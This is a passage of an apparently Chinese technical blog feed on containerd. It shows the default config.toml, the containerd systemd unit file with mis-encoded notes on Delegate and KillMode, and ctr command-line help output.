class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># cat /etc/containerd/config.toml </span><br>disabled_plugins = []<br>imports = []<br>oom_score = 0<br>plugin_dir = <span class="hljs-string">&quot;&quot;</span><br>required_plugins = []<br>root = <span class="hljs-string">&quot;/var/lib/containerd&quot;</span><br>state = <span class="hljs-string">&quot;/run/containerd&quot;</span><br>temp = <span class="hljs-string">&quot;&quot;</span><br>version = 2<br><br>[cgroup]<br>  path = <span class="hljs-string">&quot;&quot;</span><br><br>[debug]<br>  address = <span class="hljs-string">&quot;&quot;</span><br>  format = <span class="hljs-string">&quot;&quot;</span><br>  gid = 0<br>  level = <span class="hljs-string">&quot;&quot;</span><br>  uid = 0<br><br>[grpc]<br>  address = <span class="hljs-string">&quot;/run/containerd/containerd.sock&quot;</span><br>  gid = 0<br>  max_recv_message_size = 16777216<br>  max_send_message_size = 16777216<br>  tcp_address = <span class="hljs-string">&quot;&quot;</span><br>  tcp_tls_ca = <span class="hljs-string">&quot;&quot;</span><br>  tcp_tls_cert = <span class="hljs-string">&quot;&quot;</span><br>  tcp_tls_key = <span class="hljs-string">&quot;&quot;</span><br>  uid = 0<br><br>[metrics]<br>  address = <span class="hljs-string">&quot;&quot;</span><br>  grpc_histogram = <span class="hljs-literal">false</span><br><br>[plugins]<br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.gc.v1.scheduler&quot;</span>]<br>    deletion_threshold = 0<br>    mutation_threshold = 100<br>    pause_threshold = 0.02<br>    schedule_delay = <span class="hljs-string">&quot;0s&quot;</span><br>    startup_delay = <span class="hljs-string">&quot;100ms&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>]<br>    cdi_spec_dirs = [<span class="hljs-string">&quot;/etc/cdi&quot;</span>, <span class="hljs-string">&quot;/var/run/cdi&quot;</span>]<br>    device_ownership_from_security_context = <span class="hljs-literal">false</span><br>    disable_apparmor = <span class="hljs-literal">false</span><br>    disable_cgroup = <span class="hljs-literal">false</span><br>    disable_hugetlb_controller = <span class="hljs-literal">true</span><br>    disable_proc_mount = <span class="hljs-literal">false</span><br>    disable_tcp_service = <span class="hljs-literal">true</span><br>    drain_exec_sync_io_timeout = <span class="hljs-string">&quot;0s&quot;</span><br>    enable_cdi = <span class="hljs-literal">false</span><br>    enable_selinux = <span class="hljs-literal">false</span><br>    enable_tls_streaming = <span class="hljs-literal">false</span><br>    enable_unprivileged_icmp = <span class="hljs-literal">false</span><br>    enable_unprivileged_ports = <span class="hljs-literal">false</span><br>    ignore_deprecation_warnings = []<br>    ignore_image_defined_volumes = <span class="hljs-literal">false</span><br>    image_pull_progress_timeout = <span class="hljs-string">&quot;5m0s&quot;</span><br>    image_pull_with_sync_fs = <span class="hljs-literal">false</span><br>    max_concurrent_downloads = 3<br>    max_container_log_line_size = 16384<br>    netns_mounts_under_state_dir = <span class="hljs-literal">false</span><br>    restrict_oom_score_adj = <span class="hljs-literal">false</span><br>    sandbox_image = <span class="hljs-string">&quot;registry.k8s.io/pause:3.8&quot;</span><br>    selinux_category_range = 1024<br>    stats_collect_period = 10<br>    stream_idle_timeout = <span class="hljs-string">&quot;4h0m0s&quot;</span><br>    stream_server_address = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    stream_server_port = <span class="hljs-string">&quot;0&quot;</span><br>    systemd_cgroup = <span class="hljs-literal">false</span><br>    tolerate_missing_hugetlb_controller = <span class="hljs-literal">true</span><br>    unset_seccomp_profile = <span class="hljs-string">&quot;&quot;</span><br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.cni]<br>      bin_dir = <span class="hljs-string">&quot;/opt/cni/bin&quot;</span><br>      conf_dir = <span class="hljs-string">&quot;/etc/cni/net.d&quot;</span><br>      conf_template = <span class="hljs-string">&quot;&quot;</span><br>      ip_pref = <span class="hljs-string">&quot;&quot;</span><br>      max_conf_num = 1<br>      setup_serially = <span class="hljs-literal">false</span><br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd]<br>      default_runtime_name = <span class="hljs-string">&quot;runc&quot;</span><br>      disable_snapshot_annotations = <span class="hljs-literal">true</span><br>      discard_unpacked_layers = <span class="hljs-literal">false</span><br>      ignore_blockio_not_enabled_errors = <span class="hljs-literal">false</span><br>      ignore_rdt_not_enabled_errors = <span class="hljs-literal">false</span><br>      no_pivot = <span class="hljs-literal">false</span><br>      snapshotter = <span class="hljs-string">&quot;overlayfs&quot;</span><br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.default_runtime]<br>        base_runtime_spec = <span class="hljs-string">&quot;&quot;</span><br>        cni_conf_dir = <span class="hljs-string">&quot;&quot;</span><br>        cni_max_conf_num = 0<br>        container_annotations = []<br>        pod_annotations = []<br>        privileged_without_host_devices = <span class="hljs-literal">false</span><br>        privileged_without_host_devices_all_devices_allowed = <span class="hljs-literal">false</span><br>        runtime_engine = <span class="hljs-string">&quot;&quot;</span><br>        runtime_path = <span class="hljs-string">&quot;&quot;</span><br>        runtime_root = <span class="hljs-string">&quot;&quot;</span><br>        runtime_type = <span class="hljs-string">&quot;&quot;</span><br>        sandbox_mode = <span class="hljs-string">&quot;&quot;</span><br>        snapshotter = <span class="hljs-string">&quot;&quot;</span><br><br>        [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.default_runtime.options]<br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.runtimes]<br><br>        [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.runtimes.runc]<br>          base_runtime_spec = <span class="hljs-string">&quot;&quot;</span><br>          cni_conf_dir = <span class="hljs-string">&quot;&quot;</span><br>          cni_max_conf_num = 0<br>          container_annotations = []<br>          pod_annotations = []<br>          privileged_without_host_devices = <span class="hljs-literal">false</span><br>          privileged_without_host_devices_all_devices_allowed = <span class="hljs-literal">false</span><br>          runtime_engine = <span class="hljs-string">&quot;&quot;</span><br>          runtime_path = <span class="hljs-string">&quot;&quot;</span><br>          runtime_root = <span class="hljs-string">&quot;&quot;</span><br>          runtime_type = <span class="hljs-string">&quot;io.containerd.runc.v2&quot;</span><br>          sandbox_mode = <span class="hljs-string">&quot;podsandbox&quot;</span><br>          snapshotter = <span class="hljs-string">&quot;&quot;</span><br><br>          [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.runtimes.runc.options]<br>            BinaryName = <span class="hljs-string">&quot;&quot;</span><br>            CriuImagePath = <span class="hljs-string">&quot;&quot;</span><br>            CriuPath = <span class="hljs-string">&quot;&quot;</span><br>            CriuWorkPath = <span class="hljs-string">&quot;&quot;</span><br>            IoGid = 0<br>            IoUid = 0<br>            NoNewKeyring = <span class="hljs-literal">false</span><br>            NoPivotRoot = <span class="hljs-literal">false</span><br>            Root = <span class="hljs-string">&quot;&quot;</span><br>            ShimCgroup = <span class="hljs-string">&quot;&quot;</span><br>            SystemdCgroup = <span class="hljs-literal">false</span><br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.untrusted_workload_runtime]<br>        base_runtime_spec = <span class="hljs-string">&quot;&quot;</span><br>        cni_conf_dir = <span class="hljs-string">&quot;&quot;</span><br>        cni_max_conf_num = 0<br>        container_annotations = []<br>        pod_annotations = []<br>        privileged_without_host_devices = <span class="hljs-literal">false</span><br>        privileged_without_host_devices_all_devices_allowed = <span class="hljs-literal">false</span><br>        runtime_engine = <span class="hljs-string">&quot;&quot;</span><br>        runtime_path = <span class="hljs-string">&quot;&quot;</span><br>        runtime_root = <span class="hljs-string">&quot;&quot;</span><br>        runtime_type = <span class="hljs-string">&quot;&quot;</span><br>        sandbox_mode = <span class="hljs-string">&quot;&quot;</span><br>        snapshotter = <span class="hljs-string">&quot;&quot;</span><br><br>        [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.untrusted_workload_runtime.options]<br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.image_decryption]<br>      key_model = <span class="hljs-string">&quot;node&quot;</span><br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry]<br>      config_path = <span class="hljs-string">&quot;&quot;</span><br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.auths]<br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.configs]<br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.headers]<br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.mirrors]<br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.x509_key_pair_streaming]<br>      tls_cert_file = <span class="hljs-string">&quot;&quot;</span><br>      tls_key_file = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.internal.v1.opt&quot;</span>]<br>    path = <span class="hljs-string">&quot;/opt/containerd&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.internal.v1.restart&quot;</span>]<br>    interval = <span class="hljs-string">&quot;10s&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.internal.v1.tracing&quot;</span>]<br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.metadata.v1.bolt&quot;</span>]<br>    content_sharing_policy = <span class="hljs-string">&quot;shared&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.monitor.v1.cgroups&quot;</span>]<br>    no_prometheus = <span class="hljs-literal">false</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.nri.v1.nri&quot;</span>]<br>    <span class="hljs-built_in">disable</span> = <span class="hljs-literal">true</span><br>    disable_connections = <span class="hljs-literal">false</span><br>    plugin_config_path = <span class="hljs-string">&quot;/etc/nri/conf.d&quot;</span><br>    plugin_path = <span class="hljs-string">&quot;/opt/nri/plugins&quot;</span><br>    plugin_registration_timeout = <span class="hljs-string">&quot;5s&quot;</span><br>    plugin_request_timeout = <span class="hljs-string">&quot;2s&quot;</span><br>    socket_path = <span class="hljs-string">&quot;/var/run/nri/nri.sock&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.runtime.v1.linux&quot;</span>]<br>    no_shim = <span class="hljs-literal">false</span><br>    runtime = <span class="hljs-string">&quot;runc&quot;</span><br>    runtime_root = <span class="hljs-string">&quot;&quot;</span><br>    shim = <span class="hljs-string">&quot;containerd-shim&quot;</span><br>    shim_debug = <span class="hljs-literal">false</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.runtime.v2.task&quot;</span>]<br>    platforms = [<span class="hljs-string">&quot;linux/amd64&quot;</span>]<br>    sched_core = <span class="hljs-literal">false</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.service.v1.diff-service&quot;</span>]<br>    default = [<span class="hljs-string">&quot;walking&quot;</span>]<br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.service.v1.tasks-service&quot;</span>]<br>    blockio_config_file = <span class="hljs-string">&quot;&quot;</span><br>    rdt_config_file = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.aufs&quot;</span>]<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.blockfile&quot;</span>]<br>    fs_type = <span class="hljs-string">&quot;&quot;</span><br>    mount_options = []<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br>    scratch_file = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.btrfs&quot;</span>]<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.devmapper&quot;</span>]<br>    async_remove = <span class="hljs-literal">false</span><br>    base_image_size = <span class="hljs-string">&quot;&quot;</span><br>    discard_blocks = <span class="hljs-literal">false</span><br>    fs_options = <span class="hljs-string">&quot;&quot;</span><br>    fs_type = <span class="hljs-string">&quot;&quot;</span><br>    pool_name = <span class="hljs-string">&quot;&quot;</span><br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.native&quot;</span>]<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.overlayfs&quot;</span>]<br>    mount_options = []<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br>    sync_remove = <span class="hljs-literal">false</span><br>    upperdir_label = <span class="hljs-literal">false</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.snapshotter.v1.zfs&quot;</span>]<br>    root_path = <span class="hljs-string">&quot;&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.tracing.processor.v1.otlp&quot;</span>]<br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.transfer.v1.local&quot;</span>]<br>    config_path = <span class="hljs-string">&quot;&quot;</span><br>    max_concurrent_downloads = 3<br>    max_concurrent_uploaded_layers = 3<br><br>    [[plugins.<span class="hljs-string">&quot;io.containerd.transfer.v1.local&quot;</span>.unpack_config]]<br>      differ = <span class="hljs-string">&quot;&quot;</span><br>      platform = <span class="hljs-string">&quot;linux/amd64&quot;</span><br>      snapshotter = <span class="hljs-string">&quot;overlayfs&quot;</span><br><br>[proxy_plugins]<br><br>[stream_processors]<br><br>  [stream_processors.<span class="hljs-string">&quot;io.containerd.ocicrypt.decoder.v1.tar&quot;</span>]<br>    accepts = [<span class="hljs-string">&quot;application/vnd.oci.image.layer.v1.tar+encrypted&quot;</span>]<br>    args = [<span class="hljs-string">&quot;--decryption-keys-path&quot;</span>, <span class="hljs-string">&quot;/etc/containerd/ocicrypt/keys&quot;</span>]<br>    <span class="hljs-built_in">env</span> = [<span class="hljs-string">&quot;OCICRYPT_KEYPROVIDER_CONFIG=/etc/containerd/ocicrypt/ocicrypt_keyprovider.conf&quot;</span>]<br>    path = <span class="hljs-string">&quot;ctd-decoder&quot;</span><br>    returns = <span class="hljs-string">&quot;application/vnd.oci.image.layer.v1.tar&quot;</span><br><br>  [stream_processors.<span class="hljs-string">&quot;io.containerd.ocicrypt.decoder.v1.tar.gzip&quot;</span>]<br>    accepts = [<span class="hljs-string">&quot;application/vnd.oci.image.layer.v1.tar+gzip+encrypted&quot;</span>]<br>    args = [<span class="hljs-string">&quot;--decryption-keys-path&quot;</span>, <span class="hljs-string">&quot;/etc/containerd/ocicrypt/keys&quot;</span>]<br>    <span class="hljs-built_in">env</span> = [<span class="hljs-string">&quot;OCICRYPT_KEYPROVIDER_CONFIG=/etc/containerd/ocicrypt/ocicrypt_keyprovider.conf&quot;</span>]<br>    path = <span class="hljs-string">&quot;ctd-decoder&quot;</span><br>    returns = <span class="hljs-string">&quot;application/vnd.oci.image.layer.v1.tar+gzip&quot;</span><br><br>[timeouts]<br>  <span class="hljs-string">&quot;io.containerd.timeout.bolt.open&quot;</span> = <span class="hljs-string">&quot;0s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.metrics.shimstats&quot;</span> = <span class="hljs-string">&quot;2s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.shim.cleanup&quot;</span> = <span class="hljs-string">&quot;5s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.shim.load&quot;</span> = <span class="hljs-string">&quot;5s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.shim.shutdown&quot;</span> = <span class="hljs-string">&quot;3s&quot;</span><br>  <span class="hljs-string">&quot;io.containerd.timeout.task.state&quot;</span> = <span class="hljs-string">&quot;2s&quot;</span><br><br>[ttrpc]<br>  address = <span class="hljs-string">&quot;&quot;</span><br>  gid = 0<br>  uid = 0<br></code></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹serviceæ–‡ä»¶"><a href="#æŸ¥çœ‹serviceæ–‡ä»¶" class="headerlink" title="æŸ¥çœ‹serviceæ–‡ä»¶"></a>æŸ¥çœ‹serviceæ–‡ä»¶</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># cat /etc/systemd/system/containerd.service</span><br><span class="hljs-comment"># Copyright The containerd Authors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="hljs-comment"># you may not use this file except in compliance with the License.</span><br><span class="hljs-comment"># You may obtain a copy of the License at</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#     http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Unless required by applicable law or agreed to in writing, software</span><br><span class="hljs-comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="hljs-comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="hljs-comment"># See the License for the specific language governing permissions and</span><br><span class="hljs-comment"># limitations under the License.</span><br><br>[Unit]<br>Description=containerd container runtime<br>Documentation=https://containerd.io<br>After=network.target local-fs.target<br><br>[Service]<br><span class="hljs-comment">#uncomment to enable the experimental sbservice (sandboxed) version of containerd/cri integration</span><br><span class="hljs-comment">#Environment=&quot;ENABLE_CRI_SANDBOXES=sandboxed&quot;</span><br>ExecStartPre=-/sbin/modprobe overlay<br>ExecStart=/usr/local/bin/containerd<br><br>Type=notify<br>Delegate=<span class="hljs-built_in">yes</span><br>KillMode=process<br>Restart=always<br>RestartSec=5<br><span class="hljs-comment"># Having non-zero Limit*s causes performance problems due to accounting overhead</span><br><span class="hljs-comment"># in the kernel. We recommend using cgroups to do container-local accounting.</span><br>LimitNPROC=infinity<br>LimitCORE=infinity<br>LimitNOFILE=infinity<br><span class="hljs-comment"># Comment TasksMax if your systemd version does not supports it.</span><br><span class="hljs-comment"># Only systemd 226 and above support this version.</span><br>TasksMax=infinity<br>OOMScoreAdjust=-999<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š<br>1ï¼‰Delegateï¼šè¯¥é€‰é¡¹æ˜¯ä¸ºäº†å…è®¸containerdä»¥åŠè¿è¡Œæ—¶ç®¡ç†è‡ªå·±åˆ›å»ºå®¹å™¨çš„cgroupsã€‚<br>å¦‚æœè¯¥å€¼ä¸ºnoï¼Œåˆ™systemdå°±ä¼šå°†è¿›ç¨‹ç§»åˆ°è‡ªå·±çš„cgroupsä¸­ï¼Œä»è€Œå¯¼è‡´containerdæ— æ³•æ­£ç¡®ç®¡ç†å®¹å™¨çš„cgroupsä»¥åŠæ­£å¸¸è·å–å®¹å™¨çš„èµ„æºä½¿ç”¨æƒ…å†µã€‚<br>2ï¼‰KillModeï¼šè¯¥å€¼ç”¨æ¥è®¾ç½®systemdå•å…ƒè¿›ç¨‹ï¼ˆå³containerdè¿›ç¨‹ï¼‰è¢«æ€æ­»çš„æ–¹å¼ï¼Œé»˜è®¤å€¼æ˜¯control-groupï¼Œé»˜è®¤æƒ…å†µä¸‹systemdä¼šåœ¨è¿›ç¨‹çš„cgroupä¸­æŸ¥æ‰¾å¹¶æ€æ­»containerdçš„æ‰€æœ‰å­è¿›ç¨‹ã€‚<br>KillModeå­—æ®µå¯ä»¥è®¾ç½®çš„å€¼å¦‚ä¸‹ï¼š</p><ul><li>control-groupï¼ˆé»˜è®¤å€¼ï¼‰ï¼šå½“å‰æ§åˆ¶ç»„é‡Œé¢çš„æ‰€æœ‰å­è¿›ç¨‹éƒ½ä¼šè¢«æ€æ‰ã€‚</li><li>processï¼šåªæ€ä¸»è¿›ç¨‹ï¼›</li><li>mixedï¼šä¸»è¿›ç¨‹å°†æ”¶åˆ°SIGTERMä¿¡å·ï¼Œå­è¿›ç¨‹æ”¶åˆ°SIGKILLä¿¡å·ã€‚</li><li>noneï¼šæ²¡æœ‰è¿›ç¨‹è¢«æ€æ‰ï¼Œåªæ˜¯æ‰§è¡ŒæœåŠ¡çš„stopå‘½ä»¤ã€‚<br><font color=red>containerdå°†KillModeçš„å€¼è®¾ç½®ä¸ºprocessï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿å‡çº§æˆ–é‡å¯containerdæ—¶ä¸æ€æ­»ç°æœ‰çš„å®¹å™¨ã€‚</font></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdã€‘(202407) 05.containerdæ ¸å¿ƒç»„ä»¶è§£æ</title>
    <link href="/2024/07/29/containerd/%E3%80%90containerd%E3%80%91(202407)%2005.containerd%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E8%A7%A3%E6%9E%90/"/>
    <url>/2024/07/29/containerd/%E3%80%90containerd%E3%80%91(202407)%2005.containerd%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬7ç« -containerdæ ¸å¿ƒç»„ä»¶è§£æ"><a href="#ç¬¬7ç« -containerdæ ¸å¿ƒç»„ä»¶è§£æ" class="headerlink" title="ç¬¬7ç«  containerdæ ¸å¿ƒç»„ä»¶è§£æ"></a>ç¬¬7ç«  containerdæ ¸å¿ƒç»„ä»¶è§£æ</h1><h2 id="7-2-containerd-APIå’Œcore"><a href="#7-2-containerd-APIå’Œcore" class="headerlink" title="7.2 containerd APIå’Œcore"></a>7.2 containerd APIå’Œcore</h2><h3 id="7-2-1-GRPC-API"><a href="#7-2-1-GRPC-API" class="headerlink" title="7.2.1 GRPC API"></a>7.2.1 GRPC API</h3><p>ä¸åŒäºnerdctlå’Œcrictlï¼Œctræä¾›çš„åŸºæœ¬æ˜¯containerd GRPCæ¥å£çš„åŸç”Ÿèƒ½åŠ›ã€‚</p><p>containerd GRPC APIçš„å®šä¹‰åœ¨ç›®å½•<code>containerd\api\services</code>ä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr -h</span><br>NAME:<br>   ctr - <br>        __<br>  _____/ /______<br> / ___/ __/ ___/<br>/ /__/ /_/ /<br>\___/\__/_/<br><br>containerd CLI<br><br><br>USAGE:<br>   ctr [global options] <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>VERSION:<br>   v1.7.18<br><br>DESCRIPTION:<br>   <br>ctr is an unsupported debug and administrative client <span class="hljs-keyword">for</span> interacting<br>with the containerd daemon. Because it is unsupported, the commands,<br>options, and operations are not guaranteed to be backward compatible or<br>stable from release to release of the containerd project.<br><br>COMMANDS:<br>   plugins, plugin            Provides information about containerd plugins<br>   version                    Print the client and server versions<br>   containers, c, container   Manage containers<br>   content                    Manage content<br>   events, event              Display containerd events<br>   images, image, i           Manage images<br>   leases                     Manage leases<br>   namespaces, namespace, ns  Manage namespaces<br>   pprof                      Provide golang pprof outputs <span class="hljs-keyword">for</span> containerd<br>   run                        Run a container<br>   snapshots, snapshot        Manage snapshots<br>   tasks, t, task             Manage tasks<br>   install                    Install a new package<br>   oci                        OCI tools<br>   sandboxes, sandbox, sb, s  Manage sandboxes<br>   info                       Print the server info<br>   deprecations               <br>   shim                       Interact with a shim directly<br>   <span class="hljs-built_in">help</span>, h                    Shows a list of commands or <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> one <span class="hljs-built_in">command</span><br><br>GLOBAL OPTIONS:<br>   --debug                      Enable debug output <span class="hljs-keyword">in</span> logs<br>   --address value, -a value    Address <span class="hljs-keyword">for</span> containerd<span class="hljs-string">&#x27;s GRPC server (default: &quot;/run/containerd/containerd.sock&quot;) [$CONTAINERD_ADDRESS]</span><br><span class="hljs-string">   --timeout value              Total timeout for ctr commands (default: 0s)</span><br><span class="hljs-string">   --connect-timeout value      Timeout for connecting to containerd (default: 0s)</span><br><span class="hljs-string">   --namespace value, -n value  Namespace to use with commands (default: &quot;default&quot;) [$CONTAINERD_NAMESPACE]</span><br><span class="hljs-string">   --help, -h                   show help</span><br><span class="hljs-string">   --version, -v                print the version</span><br></code></pre></td></tr></table></figure><h4 id="container"><a href="#container" class="headerlink" title="container"></a>container</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 open-source]<span class="hljs-comment"># ctr container -h</span><br>NAME:<br>   ctr containers - Manage containers<br><br>USAGE:<br>   ctr containers <span class="hljs-built_in">command</span> [<span class="hljs-built_in">command</span> options] [arguments...]<br><br>COMMANDS:<br>   create                   Create container<br>   delete, del, remove, <span class="hljs-built_in">rm</span>  